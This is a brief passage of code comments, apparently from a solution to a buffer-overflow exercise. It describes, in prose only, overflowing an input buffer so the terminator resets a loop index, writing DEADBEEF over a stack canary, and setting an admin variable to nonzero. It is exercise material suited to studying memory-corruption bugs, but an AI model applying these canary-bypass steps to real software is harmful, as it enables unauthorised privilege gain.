# On the 4th entering i am overflowing the buffer by entering the wanted char (the first time D) and three more characters (including 
# the new line). The string terminator at the end will overflow into d.i, resetting it to 0 (and then 1 immediately in the loop).
# Then in the same manner (since current_token_char is now at the canary address) i enter DEADBEEF (again overflowing), 
# and in the end i enter some random values into admin (using again the incremented current_token_char), so it i not 0
